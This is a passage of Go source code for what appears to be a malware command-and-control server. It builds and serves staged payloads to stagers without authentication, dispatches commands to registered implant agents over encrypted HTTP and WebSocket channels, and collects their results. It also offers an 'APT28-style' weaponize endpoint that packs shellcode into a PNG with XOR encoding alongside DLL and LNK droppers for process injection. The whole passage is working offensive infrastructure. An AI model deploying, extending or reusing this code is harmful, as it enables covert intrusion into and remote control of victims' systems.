			cfg.ProfileCookie = p.HTTP.CookieName
			cfg.ProfileParam = p.HTTP.ParamName
			cfg.ProfileTransform = p.HTTP.DataTransform
		}
	} else {
		// 使用默认 Profile
		p := s.profileMgr.Active()
		cfg.ProfileMethod = p.HTTP.Method
		cfg.ProfilePath = p.HTTP.Path
		cfg.ProfileHeaders = p.HTTP.Headers
		cfg.ProfileCookie = p.HTTP.CookieName
		cfg.ProfileParam = p.HTTP.ParamName
		cfg.ProfileTransform = p.HTTP.DataTransform
	}

	// 根据 stage 类型选择不同的构建方法
	var outputPath string
	var err error
	switch req.Stage {
	case "stage1":
		outputPath, err = s.payloadBuilder.BuildStage1(cfg)
	case "stage2":
		outputPath, err = s.payloadBuilder.BuildStage2(cfg)
	default:
		outputPath, err = s.payloadBuilder.Build(cfg)
	}
	if err != nil {
		s.audit.Log("BUILD_FAILED", map[string]string{
			"name": req.Name, "reason": err.Error(),
		})
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	// 读取生成的 binary
	data, err := os.ReadFile(outputPath)
	if err != nil {
		http.Error(w, "failed to read payload", http.StatusInternalServerError)
		return
	}

	s.audit.Log("PAYLOAD_BUILT", map[string]string{
		"name": req.Name, "format": req.Format, "size": fmt.Sprintf("%d", len(data)),
	})

	// 返回 base64 编码的 binary
	resp := map[string]string{
		"name":     req.Name,
		"format":   req.Format,
		"size":     fmt.Sprintf("%d", len(data)),
		"output":   filepath.Base(outputPath),
		"data":     base64.StdEncoding.EncodeToString(data),
	}
	json.NewEncoder(w).Encode(resp)
}

// handleGetPubKey 返回 Server 的 RSA 公钥（供 Agent 编译时嵌入）。
func (s *Server) handleGetPubKey(w http.ResponseWriter, r *http.Request) {
	json.NewEncoder(w).Encode(map[string]string{
		"public_key": string(s.rsaKeyPair.PublicKeyPEM()),
	})
}

// handleGetECDHPubKey 返回 Server 的 X25519 ECDH 公钥（供 Agent 运行时使用）。
func (s *Server) handleGetECDHPubKey(w http.ResponseWriter, r *http.Request) {
	if s.ecdhKeyPair == nil {
		http.Error(w, "ECDH not available", http.StatusNotImplemented)
		return
	}
	json.NewEncoder(w).Encode(map[string]string{
		"ecdh_public_key": s.ecdhKeyPair.PublicKeyHex(),
	})
}

// handleStage serves encrypted stage2 payloads to stagers.
// Stagers download from /stage/{id} — no auth required (stagers can't authenticate).
func (s *Server) handleStage(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id := vars["id"]

	s.stageMu.RLock()
	data, ok := s.stageStore[id]
	s.stageMu.RUnlock()

	if !ok || len(data) == 0 {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	s.audit.Log("STAGE_SERVE", map[string]string{
		"stage_id": id,
		"ip":       r.RemoteAddr,
		"size":     fmt.Sprintf("%d", len(data)),
	})

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(data)))
	w.WriteHeader(http.StatusOK)
	w.Write(data)
}

// handleStageLookup is called by Stage1 at runtime to get stage2 download info.
// Returns {download_url, aes_key} for the latest registered Stage2.
// No authentication — stage1 cannot authenticate.
func (s *Server) handleStageLookup(w http.ResponseWriter, r *http.Request) {
	entry := s.stageRegistry.GetLatest()
	if entry == nil {
		http.Error(w, `{"error":"no stage2 registered"}`, http.StatusNotFound)
		return
	}

	resp := map[string]string{
		"download_url": entry.ExternalURL,
		"aes_key":      entry.AESKeyHex,
	}

	s.audit.Log("STAGE2_LOOKUP", map[string]string{
		"stage2_id": entry.ID,
		"ip":        r.RemoteAddr,
	})

	json.NewEncoder(w).Encode(resp)
}

// handleStageRegister registers a new Stage2 (operator API).
func (s *Server) handleStageRegister(w http.ResponseWriter, r *http.Request) {
	var req struct {
		ExternalURL string `json:"external_url"`
		AESKeyHex   string `json:"aes_key"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	entry, err := s.stageRegistry.Register(req.ExternalURL, req.AESKeyHex)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	s.audit.Log("STAGE2_REGISTER", map[string]string{
		"stage2_id":    entry.ID,
		"external_url": req.ExternalURL,
	})

	json.NewEncoder(w).Encode(map[string]string{
		"id":           entry.ID,
		"external_url": entry.ExternalURL,
		"status":       "registered",
	})
}

// handleStageList lists all registered Stage2 (operator API).
func (s *Server) handleStageList(w http.ResponseWriter, r *http.Request) {
	entries := s.stageRegistry.List()
	type entryInfo struct {
		ID          string `json:"id"`
		ExternalURL string `json:"external_url"`
	}
	info := make([]entryInfo, 0, len(entries))
	for _, e := range entries {
		info = append(info, entryInfo{
			ID:          e.ID,
			ExternalURL: e.ExternalURL,
		})
	}
	json.NewEncoder(w).Encode(info)
}

// handleOperatorRegister 注册新操作符。
func (s *Server) handleOperatorRegister(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Name string `json:"name"`
		Role string `json:"role"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	if req.Name == "" {
		http.Error(w, "name required", http.StatusBadRequest)
		return
	}
	if req.Role == "" {
		req.Role = "operator"
	}

	if s.coreSvc == nil {
		http.Error(w, "core service not initialized", http.StatusServiceUnavailable)
		return
	}
	op, err := s.coreSvc.RegisterOperator(req.Name, string(operator.Role(req.Role)))
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	s.audit.Log("OPERATOR_REGISTER", map[string]string{
		"operator_id": op.ID, "name": op.Name, "role": string(op.Role),
	})

	// 持久化到数据库
	if s.database != nil {
		apiKey := generateAPIKey()
		if err := s.database.CreateOperator(&db.Operator{
			ID: op.ID, Name: op.Name, Role: string(op.Role), APIKey: apiKey,
		}); err != nil {
			log.Printf("[WARN] failed to persist operator to db: %v", err)
		}
	}

	json.NewEncoder(w).Encode(map[string]string{
		"operator_id": op.ID,
		"name":        op.Name,
		"role":        string(op.Role),
		"status":      "registered",
	})
}

// handleOperatorConnect 操作符连接上线。
func (s *Server) handleOperatorConnect(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id := vars["id"]

	ip, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		ip = r.RemoteAddr
	}
	if err := s.operatorMgr.Connect(id, ip); err != nil {
		http.Error(w, err.Error(), http.StatusNotFound)
		return
	}

	s.audit.Log("OPERATOR_CONNECT", map[string]string{
		"operator_id": id, "ip": ip,
	})

	json.NewEncoder(w).Encode(map[string]string{"status": "connected"})
}

// handleOperatorList 列出所有操作符。
func (s *Server) handleOperatorList(w http.ResponseWriter, r *http.Request) {
	if s.coreSvc == nil {
		http.Error(w, "core service not initialized", http.StatusServiceUnavailable)
		return
	}
	ops := s.coreSvc.ListOperators()
	type opInfo struct {
		ID        string `json:"id"`
		Name      string `json:"name"`
		Role      string `json:"role"`
		Connected bool   `json:"connected"`
		LastSeen  string `json:"last_seen"`
		IPAddress string `json:"ip_address"`
	}
	info := make([]opInfo, 0, len(ops))
	for _, op := range ops {
		info = append(info, opInfo{
			ID: op.ID, Name: op.Name, Role: string(op.Role),
			Connected: op.Connected, LastSeen: op.LastSeen.Format("15:04:05"),
			IPAddress: op.IPAddress,
		})
	}
	json.NewEncoder(w).Encode(info)
}

// handleOperatorEvents SSE 事件流端点。
func (s *Server) handleOperatorEvents(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id := vars["id"]

	// 设置 SSE 头
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	// SEC-8: Restrict CORS to same-origin requests only (no arbitrary Origin reflection)
	w.Header().Set("Access-Control-Allow-Origin", "null")

	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "streaming not supported", http.StatusInternalServerError)
		return
	}

	ch, err := s.operatorMgr.Subscribe(id)
	if err != nil {
		http.Error(w, err.Error(), http.StatusNotFound)
		return
	}
	defer s.operatorMgr.Unsubscribe(id)

	ctx := r.Context()
	for {
		select {
		case <-ctx.Done():
			return
		case e, ok := <-ch:
			if !ok {
				return
			}
			fmt.Fprintf(w, "event: %s\ndata: %s\n\n", e.Type, e.Payload)
			flusher.Flush()
		}
	}
}

// handleEventHistory 返回最近的事件历史。
func (s *Server) handleEventHistory(w http.ResponseWriter, r *http.Request) {
	n := 50
	if v := r.URL.Query().Get("limit"); v != "" {
		if _, err := fmt.Sscanf(v, "%d", &n); err != nil {
			n = 50 // default on invalid input
		}
		if n < 0 {
			n = 0
		}
		if n > 500 {
			n = 500
		}
	}
	events := s.eventBroker.History(n)
	json.NewEncoder(w).Encode(events)
}

func generateAPIKey() string {
	b := make([]byte, 32)
	if _, err := rand.Read(b); err != nil {
		return fmt.Sprintf("fallback-%d", time.Now().UnixNano())
	}
	return hex.EncodeToString(b)
}

// handleWeaponize 构建 APT28 风格武器化链。
func (s *Server) handleWeaponize(w http.ResponseWriter, r *http.Request) {
	var req struct {
		PayloadFile  string `json:"payload_file"`
		PayloadType  string `json:"payload_type"`
		PNGOutput    string `json:"png_output"`
		InjectTarget string `json:"inject_target"`
		InjectMethod string `json:"inject_method"`
		XORKey       []byte `json:"xor_key"`
		SimpleLoader bool   `json:"simple_loader"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	cfg := weaponize.DefaultChainConfig()

	if req.PayloadFile != "" {
		cfg.Payload.File = req.PayloadFile
	}
	if req.PayloadType != "" {
		cfg.Payload.Type = req.PayloadType
	}
	if req.PNGOutput != "" {
		cfg.PNG.Output = req.PNGOutput
	}
	if req.InjectTarget != "" {
		cfg.EhStore.InjectTarget = req.InjectTarget
	}
	if req.InjectMethod != "" {
		cfg.EhStore.InjectMethod = req.InjectMethod
	}
	if len(req.XORKey) > 0 {
		cfg.PNG.XORKey = req.XORKey
	}
	cfg.SimpleLoader.Enabled = req.SimpleLoader

	result, err := s.weaponBuilder.Build(cfg)
	if err != nil {
		s.audit.Log("WEAPONIZE_FAILED", map[string]string{
			"payload": cfg.Payload.File, "reason": err.Error(),
		})
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	s.audit.Log("WEAPONIZE_BUILT", map[string]string{
		"payload":       cfg.Payload.File,
		"png_path":      result.PNGPath,
		"dll_path":      result.DLLPath,
		"lnk_path":      result.LNKPath,
		"shellcode_size": fmt.Sprintf("%d", result.ShellcodeSize),
		"png_size":      fmt.Sprintf("%d", result.PNGSize),
	})

	json.NewEncoder(w).Encode(result)
}

// handleWeaponizeConfig 返回默认武器化配置。
func (s *Server) handleWeaponizeConfig(w http.ResponseWriter, r *http.Request) {
	cfg := weaponize.DefaultChainConfig()
	json.NewEncoder(w).Encode(cfg)
}

// registerProfileRoutes 注册 Profile 驱动的动态端点。
func (s *Server) registerProfileRoutes(r *mux.Router) {
	// Profile 管理 API（需要 API Key 认证）
	r.HandleFunc("/api/profiles", s.requireAPIKey(s.handleListProfiles)).Methods("GET")
	r.HandleFunc("/api/profiles/active", s.requireAPIKey(s.handleGetActiveProfile)).Methods("GET")
	r.HandleFunc("/api/profiles/active", s.requireAPIKey(s.handleSetActive)).Methods("POST")

	// 根据激活的 Profile 动态注册额外端点
	p := s.profileMgr.Active()
	if p.HTTP.Path != "" {
		// 注册 Profile 定义的路径作为代理端点
		r.HandleFunc(p.HTTP.Path, s.handleProfileProxy).Methods(p.HTTP.Method)
	}

	// 兜底路由：任何未匹配的路径都走 handleProfileProxy。
	// S-P0-6: 排除 /api/* 管理端点，防止 Profile 路径覆盖管理路由
	r.PathPrefix("/").HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// /api/* 路径走 requireAPIKey 认证路由，不应被 Profile 代理拦截
		if strings.HasPrefix(r.URL.Path, "/api/") {
			http.NotFound(w, r)
			return
		}
		if r.Method == "POST" || r.Method == "GET" {
			s.handleProfileProxy(w, r)
			return
		}
		http.NotFound(w, r)
	})
}

// handleListProfiles 列出所有已注册的 Profile。
func (s *Server) handleListProfiles(w http.ResponseWriter, r *http.Request) {
	names := s.profileMgr.List()
	active := s.profileMgr.Active().Name
	if s.coreSvc != nil {
		names = s.coreSvc.ListProfiles()
		active = s.coreSvc.ActiveProfile()
	}
	json.NewEncoder(w).Encode(map[string]interface{}{
		"profiles": names,
		"active":   active,
	})
}

// handleGetActiveProfile 返回当前激活的 Profile 详情。
func (s *Server) handleGetActiveProfile(w http.ResponseWriter, r *http.Request) {
	p := s.profileMgr.Active()
	json.NewEncoder(w).Encode(p)
}

// handleSetActive 设置当前激活的 Profile。
func (s *Server) handleSetActive(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Name string `json:"name"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	if ok := s.profileMgr.SetActive(req.Name); !ok {
		if s.coreSvc != nil {
			if err := s.coreSvc.SetActiveProfile(req.Name); err != nil {
				http.Error(w, "profile not found", http.StatusNotFound)
				return
			}
		} else {
			http.Error(w, "profile not found", http.StatusNotFound)
			return
		}
	} else if s.coreSvc != nil {
		s.coreSvc.SetActiveProfile(req.Name)
	}
	s.audit.Log("PROFILE_CHANGED", map[string]string{
		"profile": req.Name,
	})
	json.NewEncoder(w).Encode(map[string]string{"status": "ok", "active": req.Name})
}

// handleProfileProxy 处理 Profile 定义路径的代理请求。
// 所有 Agent 操作都通过同一路径，根据 Envelope Type 路由。
func (s *Server) handleProfileProxy(w http.ResponseWriter, r *http.Request) {
	// SEC-7: IP 白名单检查（与 /register 等默认端点一致）
	if err := s.gateway.CheckIP(r); err != nil {
		s.audit.Log("GATEWAY_BLOCK", map[string]string{
			"reason": "ip_whitelist_profile", "ip": r.RemoteAddr,
		})
		http.Error(w, "blocked", http.StatusForbidden)
		return
	}

	env, err := s.parseEnvelope(r)
	if err != nil {
		http.Error(w, "bad envelope", http.StatusBadRequest)
		return
	}

	// Nonce 重放检查（使用 per-agent 隔离）
	if s.nonceCache.Check(env.AgentID, env.Nonce) {
		s.audit.Log("REPLAY_DETECTED", map[string]string{"ip": r.RemoteAddr})
		http.Error(w, "replay detected", http.StatusForbidden)
		return
	}

	// 根据 Envelope Type 路由
	switch env.Type {
	case protocol.TypeRegister:
		s.processRegister(env, w, r)
	case protocol.TypeHeartbeat:
		s.processHeartbeat(env, w, r)
	case protocol.TypeResult:
		s.processResult(env, w)
	default:
		// 未知类型，当作心跳处理（兼容 agent 使用 heartbeat 做 poll）
		s.processHeartbeat(env, w, r)
	}
}

// processRegister 处理已解析 Envelope 的注册请求。
func (s *Server) processRegister(env *protocol.Envelope, w http.ResponseWriter, r *http.Request) {
	var regPayload protocol.RegisterPayload
	if err := json.Unmarshal(env.Payload, &regPayload); err != nil {
		http.Error(w, "bad payload", http.StatusBadRequest)
		return
	}

	var aesKey, hmacKey []byte
	if len(regPayload.AESKeyEnc) > 0 {
		key, err := s.rsaKeyPair.Decrypt(regPayload.AESKeyEnc)
		if err != nil {
			http.Error(w, "auth failed", http.StatusForbidden)
			return
		}
		aesKey = key
		hmacKey = aesKey // RSA fallback: no separate HMAC key
	} else if len(regPayload.ECDHPubKey) == 32 && s.ecdhKeyPair != nil {
		var err error
		aesKey, hmacKey, err = servercrypto.DeriveSessionKeys(s.ecdhKeyPair, regPayload.ECDHPubKey, regPayload.AgentID)
		if err != nil {
			http.Error(w, "auth failed", http.StatusForbidden)
			return
		}
	}

	// 拒绝重复注册（N-P1-2: 原子 check-and-create）
	ip, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		ip = r.RemoteAddr
	}
	agent, created, err := s.agentMgr.RegisterIfAbsent(&regPayload, ip)
	if err != nil {
		http.Error(w, "register failed", http.StatusInternalServerError)
		return
	}
	if !created {
		s.audit.Log("REGISTER_DUPLICATE", map[string]string{
			"agent_id": regPayload.AgentID, "reason": "agent_id_already_registered_profile",
		})
		http.Error(w, "agent already registered", http.StatusConflict)
		return
	}
	agent.SetAESKey(aesKey)
	if hmacKey != nil {
		agent.SetHMACKey(hmacKey)
	}

	s.audit.Log("AGENT_REGISTER", map[string]string{
		"agent_id": regPayload.AgentID, "hostname": regPayload.Hostname,
		"os": regPayload.OS, "ip": ip,
	})

	if s.eventBroker != nil {
		s.eventBroker.Publish(event.AgentOnlineEvent(
			agent.ID, agent.Hostname, agent.OS, agent.Arch,
		))
	}

	json.NewEncoder(w).Encode(map[string]string{"status": "ok", "agent_id": agent.ID})
}

// processHeartbeat 处理已解析 Envelope 的心跳/拉取请求。
func (s *Server) processHeartbeat(env *protocol.Envelope, w http.ResponseWriter, r *http.Request) {
	ctx := &agentAuthContext{
		Envelope: env,
		Payload:  env.Payload,
	}

	agent, _ := s.agentMgr.GetAgent(env.AgentID)
	ctx.Agent = agent

	// HMAC verification
	if agent != nil {
		if hmacKey := agent.GetHMACKey(); len(hmacKey) > 0 {
			if !env.Verify(hmacKey) {
				http.Error(w, "bad signature", http.StatusForbidden)
				return
			}
		} else if key := agent.GetAESKey(); len(key) > 0 {
			// RSA 回退：无 HMAC 密钥时使用 AES 密钥（向后兼容）
			if !env.Verify(key) {
				http.Error(w, "bad signature", http.StatusForbidden)
				return
			}
		}
	}

	if ctx.Agent == nil {
		http.Error(w, "unknown agent", http.StatusNotFound)
		return
	}

	// AES-GCM decryption
	if agent != nil {
		if key := agent.GetAESKey(); len(key) > 0 {
			decrypted, err := servercrypto.DecryptAESGCM(key, env.Nonce, env.Payload)
			if err != nil {
				http.Error(w, "decryption failed", http.StatusForbidden)
				return
			}
			ctx.Payload = decrypted
		}
	}

	hb := s.parseHeartbeat(ctx, w)
	if hb == nil {
		return
	}

	// Rate limit — check before processing (matches handlePoll behavior)
	if err := s.gateway.CheckRateLimit(hb.AgentID); err != nil {
		s.audit.Log("RATE_LIMIT", map[string]string{
			"agent_id": hb.AgentID, "reason": err.Error(),
		})
		http.Error(w, `{"error": "rate limit exceeded"}`, http.StatusTooManyRequests)
		return
	}

	if _, err := s.agentMgr.ProcessHeartbeat(hb.AgentID, hb.SeqNum); err != nil {
		http.Error(w, "unknown agent", http.StatusNotFound)
		return
	}

	s.audit.Log("HEARTBEAT", map[string]string{
		"agent_id": hb.AgentID, "seq": fmt.Sprintf("%d", hb.SeqNum),
	})

	if s.eventBroker != nil {
		s.eventBroker.Publish(&event.Event{
			Type:    event.AgentHeartbeat,
			AgentID: hb.AgentID,
			Source:  "heartbeat",
			Data:    map[string]interface{}{"seq_num": hb.SeqNum},
		})
	}

	// 检查是否有待执行任务（poll 语义）
	task := s.dispatcher.NextTask(hb.AgentID)
	if task != nil {
		taskPayload := protocol.TaskPayload{
			TaskID:   task.ID,
			Command:  task.Command,
			Args:     task.Args,
			Timeout:  task.Timeout,
			Priority: task.Priority,
			AuditTag: task.AuditTag,
		}
		respData, _ := json.Marshal(map[string]interface{}{"task": taskPayload})
		if len(respData) > 1024 {
			compressed, err := compress.GzipCompress(respData)
			if err == nil {
				w.Header().Set("Content-Encoding", "gzip")
				respData = compressed
			}
		}
		w.Write(respData)
		return
	}

	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

// processResult 处理已解析 Envelope 的结果回传。
func (s *Server) processResult(env *protocol.Envelope, w http.ResponseWriter) {
	ctx := &agentAuthContext{
		Envelope: env,
		Payload:  env.Payload,
	}

	agent, _ := s.agentMgr.GetAgent(env.AgentID)
	ctx.Agent = agent

	// HMAC verification
	if agent != nil {
		if hmacKey := agent.GetHMACKey(); len(hmacKey) > 0 {
			if !env.Verify(hmacKey) {
				http.Error(w, "bad signature", http.StatusForbidden)
				return
			}
		} else if key := agent.GetAESKey(); len(key) > 0 {
			// RSA 回退：无 HMAC 密钥时使用 AES 密钥（向后兼容）
			if !env.Verify(key) {
				http.Error(w, "bad signature", http.StatusForbidden)
				return
			}
		}
	}

	if ctx.Agent == nil {
		http.Error(w, "unknown agent", http.StatusNotFound)
		return
	}

	// AES-GCM decryption
	if agent != nil {
		if key := agent.GetAESKey(); len(key) > 0 {
			decrypted, err := servercrypto.DecryptAESGCM(key, env.Nonce, env.Payload)
			if err != nil {
				http.Error(w, "decryption failed", http.StatusForbidden)
				return
			}
			ctx.Payload = decrypted
		}
	}

	var result protocol.ResultPayload
	if err := json.Unmarshal(ctx.Payload, &result); err != nil {
		http.Error(w, "bad payload", http.StatusBadRequest)
		return
	}

	// S-P0-2: 交叉验证 result.AgentID 与已认证 Agent ID
	if ctx.Agent != nil && result.AgentID != ctx.Agent.ID {
		http.Error(w, "agent id mismatch", http.StatusForbidden)
		return
	}

	s.dispatcher.SubmitResult(&result)
	s.audit.Log("TASK_RESULT", map[string]string{
		"task_id": result.TaskID, "agent_id": result.AgentID, "status": result.Status,
	})

	json.NewEncoder(w).Encode(map[string]string{"status": "received"})
}

// wsUpgrader WebSocket 连接升级器。
var wsUpgrader = websocket.Upgrader{
	ReadBufferSize:  4096,
	WriteBufferSize: 4096,
	// SEC-5: Restrict WebSocket connections to same-origin (prevent cross-site hijacking)
	CheckOrigin: func(r *http.Request) bool {
		origin := r.Header.Get("Origin")
		if origin == "" {
			return true // Non-browser clients don't send Origin
		}
		// Only allow same-origin requests
		host := r.Host
		if host == "" {
			host = r.URL.Host
		}
		u, err := url.Parse("https://" + host)
		if err != nil {
			return false
		}
		originURL, err := url.Parse(origin)
		if err != nil {
			return false
		}
		return originURL.Host == u.Host
	},
}

// handleWebSocket 处理 Agent 的 WebSocket 连接。
// Agent 通过 WebSocket 发送 Envelope，Server 处理后返回响应。
func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
	// S-P0-5: IP 白名单检查（与 /register 等默认端点一致）
	if err := s.gateway.CheckIP(r); err != nil {
		s.audit.Log("GATEWAY_BLOCK", map[string]string{
			"reason": "ip_whitelist_ws", "ip": r.RemoteAddr,
		})
		http.Error(w, "blocked", http.StatusForbidden)
		return
	}

	// SEC: Profile validation for WebSocket (consistent with HTTP endpoints)
	if s.profileValid != nil {
		s.profileValid.UpdateProfile(s.profileMgr.Active())
		result := s.profileValid.Validate(r)
		if !result.Valid {
			s.audit.Log("WS_PROFILE_MISMATCH", map[string]string{
				"ip":     r.RemoteAddr,
				"reason": result.Reason,
			})
			http.Error(w, "not found", http.StatusNotFound)
			return
		}
	}

	conn, err := wsUpgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("[server] websocket upgrade failed: %v", err)
		return
	}
	defer conn.Close()

	// SEC: Set read limit to prevent oversized messages
	conn.SetReadLimit(10 * 1024 * 1024) // 10MB max

	remoteAddr := r.RemoteAddr
	log.Printf("[server] websocket connected: %s", remoteAddr)

	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			log.Printf("[server] websocket read error: %v", err)
			return
		}

		var env protocol.Envelope
		if err := json.Unmarshal(msg, &env); err != nil {
			log.Printf("[server] websocket bad envelope: %v", err)
			conn.WriteMessage(websocket.TextMessage, []byte(`{"error":"bad envelope"}`))
			continue
		}

		// Nonce 重放检查
		if s.nonceCache.Check(env.AgentID, env.Nonce) {
			s.audit.Log("REPLAY_DETECTED", map[string]string{"ip": remoteAddr})
			conn.WriteMessage(websocket.TextMessage, []byte(`{"error":"replay"}`))
			continue
		}

		// 根据消息类型路由处理
		resp := s.handleWSMessage(&env, remoteAddr)
		respBytes, _ := json.Marshal(resp)
		conn.WriteMessage(websocket.BinaryMessage, respBytes)
	}
}

// handleWSMessage 根据消息类型处理 WebSocket 消息。
func (s *Server) handleWSMessage(env *protocol.Envelope, remoteAddr string) map[string]interface{} {
	switch env.Type {
	case protocol.TypeRegister:
		return s.handleWSRegister(env, remoteAddr)
	case protocol.TypeHeartbeat:
		return s.handleWSHeartbeat(env, remoteAddr)
	case protocol.TypeTask, "poll":
		return s.handleWSPoll(env, remoteAddr)
	case protocol.TypeResult:
		return s.handleWSResult(env)
	default:
		return map[string]interface{}{"error": "unknown type: " + env.Type}
	}
}

func (s *Server) handleWSRegister(env *protocol.Envelope, remoteAddr string) map[string]interface{} {
	// 注册消息也应当验证 HMAC（如果 Agent 已有密钥）
	if agent, ok := s.agentMgr.GetAgent(env.AgentID); ok {
		if key := agent.GetAESKey(); len(key) > 0 {
			if !env.Verify(key) {
				return map[string]interface{}{"error": "bad signature"}
			}
		}
	}

	var regPayload protocol.RegisterPayload
	if err := json.Unmarshal(env.Payload, &regPayload); err != nil {
		return map[string]interface{}{"error": "bad payload"}
	}

	// 解密/派生 AES 密钥（与 HTTP handleRegister 一致）
	var aesKey, hmacKey []byte
	if len(regPayload.AESKeyEnc) > 0 {
		key, err := s.rsaKeyPair.Decrypt(regPayload.AESKeyEnc)
		if err != nil {
			return map[string]interface{}{"error": "auth failed"}
		}
		aesKey = key
		hmacKey = aesKey // RSA fallback: no separate HMAC key
	} else if len(regPayload.ECDHPubKey) == 32 && s.ecdhKeyPair != nil {
		var err error
		aesKey, hmacKey, err = servercrypto.DeriveSessionKeys(s.ecdhKeyPair, regPayload.ECDHPubKey, regPayload.AgentID)
		if err != nil {
			return map[string]interface{}{"error": "auth failed"}
		}
	}

	ip, _, _ := net.SplitHostPort(remoteAddr)
	if ip == "" {
		ip = remoteAddr
	}

	// N-P1-2: 用原子 check-and-create 防止 TOCTOU 竞争
	agent, created, err := s.agentMgr.RegisterIfAbsent(&regPayload, ip)
	if err != nil {
		return map[string]interface{}{"error": "register failed"}
	}
	if !created {
		return map[string]interface{}{"error": "agent already registered"}
	}
	agent.SetAESKey(aesKey)
	if hmacKey != nil {
		agent.SetHMACKey(hmacKey)
	}

	s.audit.Log("AGENT_REGISTER", map[string]string{
		"agent_id": regPayload.AgentID, "hostname": regPayload.Hostname,
		"os": regPayload.OS, "ip": ip,
	})

	if s.eventBroker != nil {
		s.eventBroker.Publish(event.AgentOnlineEvent(
			agent.ID, agent.Hostname, agent.OS, agent.Arch,
		))
	}

	return map[string]interface{}{"status": "ok", "agent_id": agent.ID}
}

func (s *Server) handleWSHeartbeat(env *protocol.Envelope, remoteAddr string) map[string]interface{} {
	if agent, ok := s.agentMgr.GetAgent(env.AgentID); ok {
		if hmacKey := agent.GetHMACKey(); len(hmacKey) > 0 {
			if !env.Verify(hmacKey) {
				return map[string]interface{}{"error": "bad signature"}
			}
		} else if key := agent.GetAESKey(); len(key) > 0 {
			if !env.Verify(key) {
				return map[string]interface{}{"error": "bad signature"}
			}
		}
	}

	payload := env.Payload
	if agent, ok := s.agentMgr.GetAgent(env.AgentID); ok {
		if key := agent.GetAESKey(); len(key) > 0 {
			decrypted, err := servercrypto.DecryptAESGCM(key, env.Nonce, payload)
			if err != nil {
				return map[string]interface{}{"error": "decryption failed"}
			}
			payload = decrypted
		}
	}

	var hb protocol.HeartbeatPayload
	if err := json.Unmarshal(payload, &hb); err != nil {
		return map[string]interface{}{"error": "bad payload"}
	}

	if _, err := s.agentMgr.ProcessHeartbeat(hb.AgentID, hb.SeqNum); err != nil {
		return map[string]interface{}{"error": "unknown agent"}
	}

	s.audit.Log("HEARTBEAT", map[string]string{
		"agent_id": hb.AgentID, "seq": fmt.Sprintf("%d", hb.SeqNum),
	})

	return map[string]interface{}{"status": "ok"}
}

func (s *Server) handleWSPoll(env *protocol.Envelope, remoteAddr string) map[string]interface{} {
	if agent, ok := s.agentMgr.GetAgent(env.AgentID); ok {
		if hmacKey := agent.GetHMACKey(); len(hmacKey) > 0 {
			if !env.Verify(hmacKey) {
				return map[string]interface{}{"error": "bad signature"}
			}
		} else if key := agent.GetAESKey(); len(key) > 0 {
			if !env.Verify(key) {
				return map[string]interface{}{"error": "bad signature"}
			}
		}
	}

	// N-P1-1: Strict AES-GCM decryption
	payload := env.Payload
	if agent, ok := s.agentMgr.GetAgent(env.AgentID); ok {
		if key := agent.GetAESKey(); len(key) > 0 {
			decrypted, err := servercrypto.DecryptAESGCM(key, env.Nonce, payload)
			if err != nil {
				return map[string]interface{}{"error": "decryption failed"}
			}
			payload = decrypted
		}
	}

	var hb protocol.HeartbeatPayload
	if err := json.Unmarshal(payload, &hb); err != nil {
		return map[string]interface{}{"error": "bad payload"}
	}

	task := s.dispatcher.NextTask(hb.AgentID)
	if task == nil {
		return map[string]interface{}{"task": nil}
	}

	taskPayload := protocol.TaskPayload{
		TaskID:   task.ID,
		Command:  task.Command,
		Args:     task.Args,
		Timeout:  task.Timeout,
		Priority: task.Priority,
		AuditTag: task.AuditTag,
	}
	return map[string]interface{}{"task": taskPayload}
}

func (s *Server) handleWSResult(env *protocol.Envelope) map[string]interface{} {
	if agent, ok := s.agentMgr.GetAgent(env.AgentID); ok {
		if hmacKey := agent.GetHMACKey(); len(hmacKey) > 0 {
			if !env.Verify(hmacKey) {
				return map[string]interface{}{"error": "bad signature"}
			}
		} else if key := agent.GetAESKey(); len(key) > 0 {
			if !env.Verify(key) {
				return map[string]interface{}{"error": "bad signature"}
			}
		}
	}

	// N-P1-1: Strict AES-GCM decryption
	payload := env.Payload
	if agent, ok := s.agentMgr.GetAgent(env.AgentID); ok {
		if key := agent.GetAESKey(); len(key) > 0 {
			decrypted, err := servercrypto.DecryptAESGCM(key, env.Nonce, payload)
			if err != nil {
				return map[string]interface{}{"error": "decryption failed"}
			}
			payload = decrypted
		}
	}

	var result protocol.ResultPayload
	if err := json.Unmarshal(payload, &result); err != nil {
		return map[string]interface{}{"error": "bad payload"}
	}

	// S-P0-2: 交叉验证 result.AgentID
	if agent, ok := s.agentMgr.GetAgent(env.AgentID); ok && result.AgentID != agent.ID {
		return map[string]interface{}{"error": "agent id mismatch"}
	}

	s.dispatcher.SubmitResult(&result)

	s.audit.Log("TASK_RESULT", map[string]string{
